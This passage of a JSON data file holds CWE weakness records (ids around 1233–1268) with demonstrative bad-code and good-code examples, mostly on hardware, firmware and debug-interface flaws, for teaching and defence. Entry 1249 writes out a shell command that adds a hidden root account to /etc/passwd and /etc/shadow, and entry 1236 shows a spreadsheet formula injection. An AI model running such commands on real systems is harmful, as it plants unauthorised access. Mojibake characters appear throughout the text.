        "demonstrative_examples": "Example 1 Consider the memory configuration settings of a system that uses DDR3 DRAM memory. Protecting the DRAM memory configuration from modification by software is required to ensure that system memory access control protections cannot be bypassed. This can be done by using lock bit protection that locks all of the memory configuration registers. The memory configuration lock can be set by the BIOS during the boot process. If such a system also supports a rapid power on mode like hibernate, the DRAM data must be saved to a disk before power is removed and restored back to the DRAM once the system powers back up and before the OS resumes operation after returning from hibernate. To support the hibernate transition back to the operating state, the DRAM memory configuration must be reprogrammed even though it was locked previously. As the hibernate resume does a partial reboot, the memory configuration could be altered before the memory lock is set. Functionally the hibernate resume flow requires a bypass of the lock-based protection. The memory configuration must be securely stored and restored by trusted system firmware. Lock settings and system configuration must be restored to the same state it was in before the device entered into the hibernate mode."
    },
    {
        "id": 1233,
        "demonstrative_examples": "Example 1 For example, consider the example design below or a digital thermal sensor used in the design to detect overheating of the silicon to trigger a system shutdown. The system critical temperature limit (CRITICAL_TEMP_LIMIT) and thermal sensor calibration (TEMP_SENSOR_CALIB) data have to be programmed by the firmware. (bad code) Example Language: Other Register Field description CRITICAL_TEMP_LIMIT [31:8] Reserved field; Read only; Default 0 [7:0] Critical temp 0-255 Centigrade; Read-write-lock; Default 125 TEMP_SENSOR_CALIB [31:0] Thermal sensor calibration data. A slope value used to map sensor reading to a degree Centigrade. Read-write; Default 25 TEMP_SENSOR_LOCK [31:1] Reserved field; Read only; Default 0 [0]   Lock bit, locks CRITICAL_TEMP_LIMIT register; Write-1-once; Default 0 TEMP_HW_SHUTDOWN [31:2] Reserved field; Read only; Default 0 [1] Enable hardware shutdown on a critical temperature detection; Read-write; Default 0 CURRENT_TEMP [31:8] Reserved field; Read only; Default 0 [7:0] Current Temp 0-255 Centigrade; Read-only; Default 0 In this example note that only the CRITICAL_TEMP_LIMIT register is protected by the TEMP_SENSOR_LOCK bit, while the security design intent is to protect any modification of the critical temperature detection and response. The response of the system, if the system heats to a critical temperature, is controlled by TEMP_HW_SHUTDOWN bit [1], which is not lockable. Also, the TEMP_SENSOR_CALIB register is not protected by the lock bit. By modifying the temperature sensor calibration, the conversion of the sensor data to a degree centigrade can be changed, such that the current temperature will never be detected to exceed critical temperature value programmed by the protected lock. Similarly, by modifying the TEMP_HW_SHUTDOWN.Enable bit, the system response detection of the current temperature exceeding critical temperature can be disabled. (informative) Change TEMP_HW_SHUTDOWN and TEMP_SENSOR_CALIB controls to be locked by TEMP_SENSOR_LOCK. TEMP_SENSOR_CALIB [31:8] Thermal sensor calibration data. A slope value used to map sensor reading to a degree Centigrade. Read-write-Lock; Default 25 Locked by TEMP_SENSOR_LOCK bit[0] TEMP_HW_SHUTDOWN [31:2] Reserved field; Read only; Default 0 [1] Enable hardware shutdown on critical temperature detection; Read-write-Lock; Default 0 Locked by TEMP_SENSOR_LOCK bit[0]"
    },
    {
        "id": 1234,
        "demonstrative_examples": "Example 1 For example, consider the example Locked_override_register example. This register module supports a lock mode that blocks any writes after lock is set to 1. However, it also allows override of the lock protection when scan_mode or debug_unlocked modes are active. (bad code) Example Language: Verilog module Locked_register_example ( input [15:0] Data_in, input Clk, input resetn, input write, input Lock, input scan_mode, input debug_unlocked, output reg [15:0] Data_out ); reg lock_status; always @(posedge Clk or negedge resetn) if (~resetn) // Register is reset resetn begin \"lock_status <= 1'b0;\" end else if (Lock) begin \"lock_status <= 1'b1;\" end else if (~Lock) begin lock_status <= lock_status end always @(posedge Clk or negedge resetn) if (~resetn) // Register is reset resetn begin \"Data_out <= 16'h0000;\" end else if (write & (~lock_status | scan_mode | debug_unlocked) ) // Register protected by Lock bit input, overrides supported for scan_mode & debug_unlocked begin Data_out <= Data_in; end else if (~write) begin Data_out <= Data_out; end endmodule If either the scan_mode or the debug_unlocked modes can be triggered by software, then the lock protection may be bypassed. (good code) Either remove the debug and scan mode overrides or protect enabling of these modes so that only trusted and authorized users may enable these modes."
    },
    {
        "id": 1235,
        "demonstrative_examples": "Example 1 Java has a boxed primitive for each primitive type. A long can be represented with the boxed primitive Long. Issues arise where boxed primitives are used when not strictly necessary. (bad code) Example Language: Java Long count = 0L; for (long i = 0; i < Integer.MAX_VALUE; i++) { count += i; } In the above loop, we see that the count variable is declared as a boxed primitive. This causes autoboxing on the line that increments. This causes execution to be magnitudes less performant (time and possibly space) than if the \"long\" primitive was used to declare the count variable, which can impact availability of a resource. Example 2 This code uses primitive long which fixes the issue. (good code) Example Language: Java long count = 0L; for (long i = 0; i < Integer.MAX_VALUE; i++) { count += i; }"
    },
    {
        "id": 1236,
        "demonstrative_examples": "Example 1 \"Hyperlinks or other commands can be executed when a cell begins with the formula identifier, '='\" (attack code) Example Language: Other =HYPERLINK(link_location, [friendly_name]) Stripping the leading equals sign, or simply not executing formulas from untrusted sources, impedes malicious activity. (good code) HYPERLINK(link_location, [friendly_name])"
    },
    {
        "id": 1239,
        "demonstrative_examples": "Example 1 Suppose a hardware IP for implementing an encryption routine works as expected, but it leaves the intermediate results in some registers that can be accessed. Exactly why this access happens is immaterial - it might be unintentional or intentional, where the designer wanted a \"quick fix\" for something."
    },
    {
        "id": 1240,
        "demonstrative_examples": "Example 1 Re-using random values may compromise security (bad code) Suppose a Hashing algorithm needs a random value. Instead of using a DRNG (Deterministic Random Number Generator), the designer uses a LFSR to generate the value. While an LFSR does provide pseudo-random number generation service, its entropy (measure of randomness) is less than that of a DRNG. Thus, using an LFSR weakens the strength of the crypto. (good code) If a cryptographic algorithm expects a random number as its input, provide one. Do not provide a pseudo-random value."
    },
    {
        "id": 1241,
        "demonstrative_examples": "Example 1 Suppose a cryptographic function expects random value to be supplied for the crypto algorithm. During the implementation phase, due to space constraint, a cryptographically secure random-number-generator could not be used, and instead  of using a TRNG (True Random Number Generator), a LFSR (Linear Feedback Shift Register) is used to generate a random value. While an LFSR will provide a pseudo-random number, its entropy (measure of randomness) is insufficient for a cryptographic algorithm."
    },
    {
        "id": 1242,
        "demonstrative_examples": "Example 1 Consider a device that comes with various security measures, such as secure boot. The secure-boot process performs firmware-integrity verification at boot time, and this code is stored in a separate SPI-flash device. However, this code contains undocumented \"special access features\" intended to be used only for performing failure analysis and intended to only be unlocked by the device designer. (bad code) Example Language: Other Attackers dump the code from the device and then perform reverse engineering to analyze the code. The undocumented, special-access features are identified, and attackers can activate them by sending specific commands via UART before secure-boot phase completes. Using these hidden features, attackers can perform reads and writes to memory via the UART interface. At runtime, the attackers can also execute arbitrary code and dump the entire memory contents. Remove all chicken bits and hidden features that are exposed to attackers. Add authorization schemes that rely on cryptographic primitives to access any features that the manufacturer does not want to expose. Clearly document all interfaces."
    },
    {
        "id": 1243,
        "demonstrative_examples": "Example 1 Sensitive manufacturing data (such as die information) are stored in fuses. When the chip powers on, these values are read from the fuses and stored in microarchitectural registers. These registers are only given read access to trusted software running on the core. Untrusted software running on the core is not allowed to access these registers. (bad code) Example Language: Other All microarchitectural registers in this chip can be accessed through the debug interface. As a result, even an untrusted debugger can access this data and retrieve sensitive manufacturing data. (informative) Registers used to store sensitive values read from fuses should be blocked during debug. These registers should be disconnected from the debug interface."
    },
    {
        "id": 1244,
        "demonstrative_examples": "Example 1 The JTAG interface is used to perform debugging and provide CPU core access for developers. JTAG-access protection is implemented as part of the JTAG_SHIELD bit in the hw_digctl_ctrl register. This register has no default value at power up and is set only after the system boots from ROM and control is transferred to the user software. (bad code) Example Language: Other 1 bit 0x0 = JTAG debugger is enabled (default) JTAG_SHIELD 0x1 = JTAG debugger is disabled This means that as the end user has access to JTAG at system reset and during ROM code execution before control is transferred to user software, a JTAG user can modify the boot flow and subsequently disclose all CPU information including data-encryption keys. (informative) The default value of this register bit should be set to 1 to prevent the JTAG from being enabled at system reset."
    },
    {
        "id": 1245,
        "demonstrative_examples": "Example 1 The FSM shown in the \"bad\" code snippet below assigns the output out based on the value of state, which is determined based on the user provided input, user_input. (bad code) Example Language: Verilog module fsm_1(out, user_input, clk, rst_n); input [2:0] user_input; input clk, rst_n; output reg [2:0] out; reg [1:0] state; always @ (posedge clk or negedge rst_n ) begin if (!rst_n) \"state = 3'h0;\" else case (user_input) \"3'h0:\" \"3'h1:\" \"3'h2:\" \"3'h3: state = 2'h3;\" \"3'h4: state = 2'h2;\" \"3'h5: state = 2'h1;\" endcase end \"out <= {1'h1, state};\" endmodule \"The case statement does not handle the scenario when user provides inputs of 3'h6 and 3'h7 using a default statement.  Those inputs push the system to an undefined state and might cause a crash (denial of service) or any other unanticipated outcome.\" Adding a default statement to handle undefined inputs mitigates this issue.  This is shown in the \"Good\" code snippet below.  The default statement is in bold. (good code) Example Language: Other case (user_input) \"3'h0:\" \"3'h1:\" \"3'h2:\" \"3'h3: state = 2'h3;\" \"3'h4: state = 2'h2;\" \"3'h5: state = 2'h1;\" \"default: state = 2'h0;\" endcase"
    },
    {
        "id": 1246,
        "demonstrative_examples": "Example 1 An attacker can render a memory line unusable by repeatedly causing a write to the memory line. Below is example code from [ REF-1058 ] that the user can execute repeatedly to cause line failure. W is the maximum associativity of any cache in the system; S is the size of the largest cache in the system. (bad code) Example Language: Other Do aligned alloc of (W+1) arrays each of size S while(1) { for (ii = 0; i < W + 1; ii++) array[ii].element[0]++; } Without wear leveling, the above attack will be successful. Simple randomization of blocks will not suffice as instead of the original physical block, the randomized physical block will be worn out. (informative) Wear leveling must be used to even out writes to the device."
    },
    {
        "id": 1247,
        "demonstrative_examples": "Example 1 Below is a representative snippet of C code that is part of the secure-boot flow. A signature of the runtime-firmware image is calculated and compared against a golden value. If the signatures match, the bootloader loads runtime firmware. If there is no match, an error halt occurs. If the underlying hardware executing this code does not contain any circuitry or sensors to detect voltage or clock glitches, an attacker might launch a fault-injection attack right when the signature check is happening (at the location marked with the comment), causing a bypass of the signature-checking process. (bad code) Example Language: Other ... if (signature_matches)  // <-Glitch Here { load_runtime_firmware(); } else { do_not_load_runtime_firmware(); } ... After bypassing secure boot, an attacker can gain access to system assets to which the attacker should not have access. (informative) If the underlying hardware detects a voltage or clock glitch, the information can be used to prevent the glitch from being successful."
    },
    {
        "id": 1248,
        "demonstrative_examples": "Example 1 The network-on-chip implements a firewall for access control to peripherals from all IP cores capable of mastering transactions. (bad code) Example Language: Other A manufacturing defect in this logic manifests itself as a logical fault, which always sets the output of the filter to \"allow\" access. Post-manufacture testing must be performed to ensure that hardware logic implementing security functionalities is defect-free."
    },
    {
        "id": 1249,
        "demonstrative_examples": "Example 1 \"Suppose that an attacker successfully gains root privileges on a Linux system and adds a new 'user2' account:\" (attack code) Example Language: Other echo \"user2:x:0:0::/root:/\" >> /etc/passwd; echo\\n\\t\\t\\t\\t\\t  \"user2:\\\\$6\\\\$IdvyrM6VJnG8Su5U\\\\$1gmW3Nm.IO4vxTQDQ1C8urm72JCadOHZQwqiH/nRtL8dPY80xS4Ovsv5bPCMWnXKKWwmsocSWXupUf17LB3oS.:17256:0:99999:7:::\" >> /etc/shadow; This new user2 account would not be noticed on the web interface, if the interface does not refresh its data of available users. It could be argued that for this specific example, an attacker with root privileges would be likely to compromise the admin tool or otherwise feed it with false data.  However, this example shows how the discrepancy in critical data can help attackers to escape detection."
    },
    {
        "id": 1250,
        "demonstrative_examples": "Example 1 Suppose a processor\\'s Memory Management Unit (MMU) has 5 other shadow MMUs to distribute its workload for its various cores. Each MMU has the start address and end address of \"accessible\" memory. Any time this accessible range changes (as per the processor\\'s boot status), the main MMU sends an update message to all the shadow MMUs. Suppose the interconnect fabric does not prioritize such \"update\" packets over other general traffic packets. This introduces a race condition. If an attacker can flood the target with enough messages so that some of those attack packets reach the target before the new access ranges gets updated, then the attacker can leverage this scenario."
    },
    {
        "id": 1251,
        "demonstrative_examples": "Example 1 Suppose a processor\\'s Memory Management Unit (MMU) has 5 other shadow MMUs to distribute its workload for its various cores. Each MMU has the start address and end address of \"accessible\" memory. Any time this accessible range changes (as per the processor\\'s boot status), the main MMU sends an update message to all the shadow MMUs. Suppose the interconnect fabric does not prioritize such \"update\" packets over other general traffic packets. This introduces a race condition. If an attacker can flood the target with enough messages so that some of those attack packets reach the target before the new access ranges gets updated, then the attacker can leverage this scenario."
    },
    {
        "id": 1252,
        "demonstrative_examples": "Example 1 MCS51 Microcontroller (based on 8051) does not have a special bit to support write exclusivity. It also does not have an MMU/MPU support. The Cortex-M CPU has an optional MPU that supports up to 8 regions. (bad code) Example Language: Other The optional MPU is not configured. If the MPU is not configured, then an attacker will be able to inject malicious data into memory and execute it."
    },
    {
        "id": 1253,
        "demonstrative_examples": "Example 1 A chip implements a secure boot and uses the sensed value of a fuse \\n         \"do_secure_boot\" to determine whether to perform a secure boot or not. If this fuse \\n         value is \"0\", the system performs secure boot. Otherwise, it does not perform secure \\n         boot. An attacker blows the \"do_secure_boot\" fuse to \"1\". After reset, the attacker loads a custom \\n         bootloader, and, since the fuse value is now \"1\", the system does not perform secure boot, \\n         and the attacker can execute their custom firmware image. Since by default, a fuse-configuration value is a \"0\", an attacker can blow it to a \"1\" with \\n         inexpensive hardware. If the logic is reversed, an attacker cannot easily reset the fuse. Note that, with \\n         specialized and expensive equipment, an attacker with full physical access might be able to \"unblow\" the fuse \\n         value to a \"0\"."
    },
    {
        "id": 1254,
        "demonstrative_examples": "Example 1 Consider an example hardware module that checks a user-provided password to grant access to a user. The user-provided password is compared against a golden value in a byte-by-byte manner. (bad code) Example Language: Other always_comb @ (posedge clk) begin assign check_pass[3:0] = 4\u00e2\\x80\\x99b0; for (i = 0; i < 4; i++) begin if (entered_pass[(i*8 \u00e2\\x80\\x93 1) : i] eq golden_pass([i*8 -1) : i]) assign check_pass[i] = 1; continue; else assign check_pass[i] = 0; break; end assign grant_access = (check_pass == 4\u00e2\\x80\\x99b1111) ? 1\u00e2\\x80\\x99b1: 1\u00e2\\x80\\x99b0; end Since the code breaks on an incorrect entry of password, an attacker can guess the correct password for that byte-check iteration with few repeat attempts. (informative) Either the comparison of the entire string should be done all at once or the attacker is not given an indication whether pass or fail happened by allowing the comparison to run through all bits before the grant_access signal is set. always_comb @ (posedge clk) begin assign check_pass[3:0] = 4\u00e2\\x80\\x99b0; for (i = 0; i < 4; i++) begin if (entered_pass[(i*8 \u00e2\\x80\\x93 1) : i] eq golden_pass([i*8 -1) : i]) assign check_pass[i] = 1; continue; else assign check_pass[i] = 0; continue; end assign grant_access = (check_pass == 4\u00e2\\x80\\x99b1111) ? 1\u00e2\\x80\\x99b1: 1\u00e2\\x80\\x99b0; end"
    },
    {
        "id": 1255,
        "demonstrative_examples": "Example 1 Consider an example hardware module that checks a user-provided password (or PIN) to grant access to a user. The user-provided password is compared against a stored value byte-by-byte. (bad code) Example Language: Other static nonvolatile password_tries = NUM_RETRIES; do while (password_tries == 0) ; // Hang here if no more password tries password_ok = 0; for (i = 0; i < NUM_PW_DIGITS; i++) if (GetPasswordByte() == stored_password([i]) password_ok |= 1; // Power consumption is different here else password_ok |= 0; // than from here end if (password_ok > 0) password_tries = NUM_RETRIES; break_to_Ok_to_proceed password_tries--; while (true) // Password OK \"Since the algorithm uses a different number of 1's and 0's for password validation, a different amount of power is consumed for the good byte versus the bad byte comparison. Using this information, an attacker may be able to guess the correct password for that byte-by-byte iteration with several repeated attempts by stopping the password evaluation before it completes.\" (good code) Among various options for mitigating the string comparison is obscuring the power comsumption by having opposing bit flips during bit operations. Note that in this example, the initial change of the bit values could still provide power indication depending upon the hardware itself. This possibility needs to be measured for verification. static nonvolatile password_tries = NUM_RETRIES; do while (password_tries == 0) ; // Hang here if no more password tries password_tries--;  // Put retry code here to catch partial retries password_ok = 0; for (i = 0; i < NUM_PW_DIGITS; i++) if (GetPasswordByte() == stored_password([i]) password_ok |= 0x10; // Power consumption here else password_ok |= 0x01; // is now the same here end if ((password_ok & 1) == 0) password_tries = NUM_RETRIES; break_to_Ok_to_proceed while (true) // Password OK \"Since the algorithm uses a different number of 1's and 0's for password validation, a different amount of power is consumed for the good byte versus the bad byte comparison. Using this information, an attacker may be able to guess the correct password for that byte-by-byte iteration with several repeated attempts by stopping the password evaluation before it completes.\" (good code) An alternative to the previous example is simply comparing the whole password simultaneously. static nonvolatile password_tries = NUM_RETRIES; do while (password_tries == 0) ; // Hang here if no more password tries password_tries--;  // Put retry code here to catch partial retries for (i = 0; i < NUM_PW_DIGITS; i++) stored_password([i] = GetPasswordByte(); end if (stored_password == saved_password) password_tries = NUM_RETRIES; break_to_Ok_to_proceed while (true) // Password OK Since comparison is done atomically, there is no indication which bytes fail forcing the attacker to brute force the whole password at once. Note that other mitigations may exist such as masking - causing a large current draw to mask individual bit flips."
    },
    {
        "id": 1256,
        "demonstrative_examples": "Example 1 This example considers the Row-Hammar problem. .The Row-Hammar issue was caulse by a program in a tight loop writing repeatedly to a location to which the program was allowed to write but causing an adjacent memory location value to change. (bad code) Example Language: Other Continuously writting the same value to the same address causes the value of an adjacent location to change value. Preventing the loop required to defeat the Row-Hammar exploit is not always possible: (good code) Example Language: Other Redesign the RAM devices to reduce inter capacitive coupling making the Row-Hammar exploit impossible. While the redesign may be possible for new devices, a redesign is not possible in existing devices. There is also the possibility that reducing capacitance with a relayout would impact the density of the device resulting in a less capable, more costly device. Example 2 Suppose a hardware design implements a set of software-accessible registers for scaling clock frequency and voltage but does not control access to these registers. Attackers may cause register and memory changes and race conditions by changing the clock or voltage of the device under their control."
    },
    {
        "id": 1257,
        "demonstrative_examples": "Example 1 In a System-on-a-Chip (SoC) design the system fabric uses 16 bit addresses. An IP unit (Unit_A) has 4 kilobyte of internal memory which is mapped into a 16 kilobyte address range in the system fabric address map. System Address Mapped to 0x0000 \u00e2\\x80\\x93 0x3FFF Unit_A  registers : 0x0000 \u00e2\\x80\\x93 0x0FFF 0x4000 \u00e2\\x80\\x93 0xFFFF Other IPs & Memory To protect the register controls in Unit_A unprivileged software is blocked from accessing addresses between 0x0000 \u00e2\\x80\\x93 0x0FFF. The address decoder of Unit_A masks off the higher order address bits and decodes only the lower 12 bits for computing the offset into the 4 kilobyte internal memory space. (bad code) Example Language: Other In this design  the aliased memory address ranges are these: 0x0000 \u00e2\\x80\\x93 0x0FFF 0x1000 \u00e2\\x80\\x93 0x1FFF 0x2000 \u00e2\\x80\\x93 0x2FFF 0x3000 \u00e2\\x80\\x93 0x3FFF The same register can be accessed using four different addresses: 0x0000, 0x1000, 0x2000, 0x3000. The system address filter only blocks access to range 0x0000 - 0x0FFF and does not block access to the aliased addresses in 0x1000 - 0x3FFF range. Thus, untrusted software can leverage the aliased memory addresses to bypass the memory protection. (good code) Example Language: Other In this design the aliased memory addresses (0x1000 - 0x3FFF) could be blocked from all system software access since they are not used by software. Alternately, the MPU logic can be changed to apply the memory protection policies to the full address range mapped to Unit_A (0x0000 - 0x3FFF)."
    },
    {
        "id": 1258,
        "demonstrative_examples": "Example 1 A cryptographic core in a System-On-a-Chip (SoC) is used for cryptographic acceleration and implements several cryptographic operations (e.g., computation of AES encryption and decryption, SHA-256, HMAC, etc.). The keys for these operations or the intermediate values are stored in registers internal to the cryptographic core. These internal registers are in the Memory Mapped Input Output (MMIO) space and are blocked from access by software and other untrusted agents on the SoC. These registers are accessible through the debug and test interface. (bad code) Example Language: Other In the above scenario, registers that store keys and intermediate values of cryptographic operations are not cleared when system enters debug mode. An untrusted actor running a debugger may read the contents of these registers and gain access to secret keys and other sensitive cryptographic information. (good code) Example Language: Other Whenever the chip enters debug mode, all registers containing security-sensitive data are be cleared rendering them unreadable."
    },
    {
        "id": 1259,
        "demonstrative_examples": "Example 1 For example, consider a system with a register for storing an AES key for encryption and decryption. The key is of 128 bits implemented as a set of four 32-bit registers. The key register assets have an associated control register, AES_KEY_ACCESS_POLICY, which provides the necessary access controls. This access-policy register defines which agents may engage in a transaction, and the type of transaction, with the AES-key registers. Each bit in this 32-bit register defines a security Token. There could be a maximum of 32 security Tokens that are allowed access to the AES-key registers. The number of the bit when set (i.e., \u00e2\\x80\\x9c1\u00e2\\x80\\x9d) allows respective action from an agent whose identity matches the number of the bit and, if \u00e2\\x80\\x9c0\u00e2\\x80\\x9d (i.e., Clear), disallows the respective action to that corresponding agent. Let\u00e2\\x80\\x99s assume the system has two agents: a Main-controller and an Aux-controller. The respective Security Tokens are \u00e2\\x80\\x9c1\u00e2\\x80\\x9d and \u00e2\\x80\\x9c2\u00e2\\x80\\x9d. Register Description Default AES_ENC_DEC_KEY_0 AES key [0:31] for encryption or decryption 0x00000000 AES_ENC_DEC_KEY_1 AES key [32:63] for encryption or decryption 0x00000000 AES_ENC_DEC_KEY_2 AES key [64:95] for encryption or decryption 0x00000000 AES_ENC_DEC_KEY_3 AES key [96:127] for encryption or decryption 0x00000000 AES_KEY_ACCESS_POLICY AES key access register [31:0] 0x00000002 An agent with Security Token \u00e2\\x80\\x9c1\u00e2\\x80\\x9d has access to AES_ENC_DEC_KEY_0 through AES_ENC_DEC_KEY_3 registers. As per the above access policy, the AES-Key-access policy allows access to the AES-key registers if the security Token is \u00e2\\x80\\x9c1\u00e2\\x80\\x9d. (bad code) Example Language: Other The Aux-controller could program its Security Token to \u00e2\\x80\\x9c1\u00e2\\x80\\x9d from \u00e2\\x80\\x9c2\u00e2\\x80\\x9d. The SoC does not properly protect the Security Token of the agents, and, hence, the Aux-controller in the above example can spoof the transaction (i.e., send the transaction as if it is coming from the Main-controller to access the AES-Key registers) (good code) Example Language: Other The SoC needs to protect the Security Tokens. None of the agents in the SoC should have the ability to change the Security Token."
    },
    {
        "id": 1260,
        "demonstrative_examples": "Example 1 For example, consider a design with a 16-bit address that has two software privilege levels: Privilege_SW and Non_privilege_SW. To isolate the system memory regions accessible by these two privilege levels, the design supports three memory regions: Region_0, Region_1, Region_2. Region_0 & Region_1: registers are programmable by Privilege_SW Region_2: registers are programmable by Non_privilege_SW Each region range is defined by two 32 bit registers Address_range and Access_policy: Address_range[15:0]: specifies the Base address of the region Address_range[31:16]: specifies the size of the region Access_policy[0]: if set to one, allows reads from Non_privilege_SW Access_policy[1]: if set to one, allows writes from Non_privilege_SW Access_policy[0]: if set to one, allows reads from Privilege_SW Access_policy[1]: if set to one, allows writes from Privilege_SW The address-protection filter checks the address range and access policies of all three regions and only allows software access if all three filters allow access. (bad code) In this design example, Non_privilege_SW cannot modify memory region and policies defined by Privilege_SW in Region_0 and Region_1.  Thus, it cannot read or write the memory regions that Privilege_SW is using. However, Non_privilege_SW can program Region_2 registers to overlap with Region_0 or Region_1, and it can also define the access policy of Region_2. Using this capability, it is possible for Non_privilege_SW to block any memory region from being accessed by Privilege_SW, including the memory regions protected by Region_0 and Region_1. (good code) In such a design, a memory region priority should be defined to ensure that the memory region defined by Non_privilege_SW in Region_2 cannot change the access policy defined in Region_0 or Region_1."
    },
    {
        "id": 1261,
        "demonstrative_examples": "Example 1 This is an example from [ REF-1089 ]. See the reference for full details of this issue. Parity is error detecting but not error correcting. (bad code) Example Language: Other Due to single-event upsets, bits are flipped in memories.  As a result, memory-parity checks fail, which results in restart and a temporary denial of service of two to three minutes. (good code) Example Language: Other Using error-correcting codes could have avoided the restart caused by SEUs. Example 2 In 2016, a security researcher, who was also a patient using a pacemaker, was on an airplane when a bit flip occurred in the pacemaker, likely due to the higher prevalence of cosmic radiation at such heights. The pacemaker was designed to account for bit flips and went into a default safe mode, which still forced the patient to go to a hospital to get it reset. The bit flip also inadvertently enabled the researcher to access the crash file, perform reverse engineering, and detect a hard-coded key. [ REF-1101 ]"
    },
    {
        "id": 1262,
        "demonstrative_examples": "Example 1 The register interface provides software access to hardware functionality. This functionality is an attack surface. This attack surface may be used to run untrusted code on the system through the register interface. As an example, cryptographic accelerators require a mechanism for software to select modes of operation and to provide plaintext or ciphertext data to be encrypted or decrypted as well as other functions. This functionality is commonly provided through registers. (bad code) Cryptographic key material stored in registers inside the cryptographic accelerator can be accessed by software. (good code) Key material stored in registers should never be accessible to software. Even if software can provide a key, all read-back paths to software should be disabled."
    },
    {
        "id": 1263,
        "demonstrative_examples": ""
    },
    {
        "id": 1264,
        "demonstrative_examples": "Example 1 There are several standard on-chip bus protocols used in modern SoCs to allow communication between components. There are a wide variety of commercially available hardware IP implementing the interconnect logic for these protocols. A bus connects components which initiate/request communications such as processors and DMA controllers (bus masters) with peripherals which respond to requests. In a typical system, the privilege level or security designation of the bus master along with the intended functionality of each peripheral determine the security policy specifying which specific bus masters can access specific peripherals.  This security policy (commonly referred to as a bus firewall) can be enforced using separate IP/logic from the actual interconnect responsible for the data routing. (bad code) Example Language: Other The firewall and data routing logic becomes de-synchronized due to a hardware logic bug allowing components that should not be allowed to communicate to share data. For example, consider an SoC with two processors. One is being used as a root of trust and can access a cryptographic key storage peripheral. The other processor (application cpu) may run potentially untrusted code and should not access the key store. If the application cpu can issue a read request to the key store which is not blocked due to de-synchronization of data routing and the bus firewall, disclosure of cryptographic keys is possible. (good code) Example Language: Other All data is correctly buffered inside the interconnect until the firewall has determined that the endpoint is allowed to receive the data."
    },
    {
        "id": 1265,
        "demonstrative_examples": "Example 1 The implementation of the Widget class in the following C++ code is an example of code that is not designed to be reentrant. If an invocation of a method of Widget inadvertently produces a second nested invocation of a method of Widget, then data member backgroundImage may unexpectedly change during execution of the outer call. (bad code) Example Language: C++ class Widget { private: Image* backgroundImage; public: void click() { if (backgroundImage) { backgroundImage->click(); } } void changeBackgroundImage(Image* newImage) { if (backgroundImage) { delete backgroundImage; } backgroundImage = newImage; } } class Image { public: void click() { scriptEngine->fireOnImageClick(); /* perform some operations using \u00e2\\x80\\x9cthis\u00e2\\x80\\x9d pointer */ } } Looking closer at this example, Widget::click() calls backgroundImage->click(), which in turn calls scriptEngine->fireOnImageClick(). The code within fireOnImageClick() invokes the appropriate script handler routine as defined by the document being rendered. In this scenario this script routine is supplied by an adversary and this malicious script makes a call to Widget::changeBackgroundImage(), deleting the Image object pointed to by backgroundImage. When control returns to Image::click, the function\u00e2\\x80\\x99s \"backgroundImage \"this\" pointer (which is the former value of backgroundImage) is a dangling pointer. The root of this weakness is that while one operation on Widget (click) is in the midst of executing, a second operation on the Widget object may be invoked (in this case, the second invocation is a call to different method, namely changeBackgroundImage) that modifies the non-local variable. Example 2 This is another example of C++ code that is not designed to be reentrant. (bad code) Example Language: C++ class Request { private: std::string uri; /* ... */ public: void setup(ScriptObject* _uri) { this->uri = scriptEngine->coerceToString(_uri); /* ... */ } void send(ScriptObject* _data) { Credentials credentials = GetCredentials(uri); std::string data = scriptEngine->coerceToString(_data); doSend(uri, credentials, data); } } \"The expected order of operations is a call to Request::setup(), followed by a call to Request::send(). Request::send() calls scriptEngine->coerceToString(_data) to coerce a script-provided parameter into a string. This operation may produce script execution. For example, if the script language is ECMAScript, arbitrary script execution may result if _data is an adversary-supplied ECMAScript object having a custom toString method. If the adversary's script makes a new call to Request::setup, then when control returns to Request::send, the field uri and the local variable credentials will no longer be consistent with one another. As a result, credentials for one resource will be shared improperly with a different resource. The root of this weakness is that while one operation on Request (send) is in the midst of executing, a second operation may be invoked (setup).\""
    },
    {
        "id": 1266,
        "demonstrative_examples": ""
    },
    {
        "id": 1267,
        "demonstrative_examples": "Example 1 For example, consider a system that has four bus masters. The table below provides bus masters, their Security Tokens, and trust assumptions. Bus Master Security Token Decoding Trust Assumptions Master_0 \"00\" Untrusted Master_1 \"01\" Trusted Master_2 \"10\" Untrusted Master_3 \"11\" Untrusted The policy encoding is to be defined such that Security Token will be used in implemented access-controls. The bits in the bus transaction that contain Security-Token information are Bus_transaction [15:11]. The assets are the AES-Key registers for encryption or decryption. The key of 128 bits is implemented as a set of four, 32-bit registers. Register Field description AES_ENC_DEC_KEY_0 AES key [0:31] for encryption or decryption, Default 0x00000000 AES_ENC_DEC_KEY_1 AES key [32:63] for encryption or decryption, Default 0x00000000 AES_ENC_DEC_KEY_2 AES key [64:95] for encryption or decryption, Default 0x00000000 AES_ENC_DEC_KEY_4 AES key [96:127] for encryption or decryption, Default 0x00000000 Below is an example of a policy encoding scheme inherited from a previous project where all \"ODD\" numbered Security Tokens are trusted. (bad code) If (Bus_transaction[14] == \"1\") Trusted = \"1\" Else Trusted = \"0\" If (trusted) Allow access to AES-Key registers Else Deny access to AES-Key registers The inherited policy encoding is obsolete and does not work for the new system where an untrusted bus master with an odd Security Token exists in the system, i.e., Master_3 whose Security Token is \"11\". Based on the old policy, the untrusted bus master (Master_3) has access to the AES-Key registers. To resolve this, a register AES_KEY_ACCESS_POLICY can be defined to provide necessary, access controls: New Policy: AES_KEY_ACCESS_POLICY [31:0] Default 0x00000002 \u00e2\\x80\\x93 agent with Security Token \"1\" has access to AES_ENC_DEC_KEY_0 through AES_ENC_DEC_KEY_4 registers The AES_KEY_ACCESS_POLICY register defines which agents with a Security Token in the transaction can access the AES-key registers. Each bit in this 32-bit register defines a Security Token. There could be a maximum of 32 security Tokens that are allowed access to the AES-key registers. The number of the bit when set (i.e., \"1\") allows respective action from an agent whose identity matches the number of the bit and, if \"0\" (i.e., Clear), disallows the respective action to that corresponding agent. Thus, any bus master with Security Token \"01\" is allowed access to the AES-Key registers. Below is the Pseudo Code for policy encoding: (good code) Security_Token[4:0] = Bus_transaction[15:11] If (AES_KEY_ACCESS_POLICY[Security_Token] == \"1\") Allow access to AES-Key registers Else Deny access to AES-Key registers"
    },
    {
        "id": 1268,
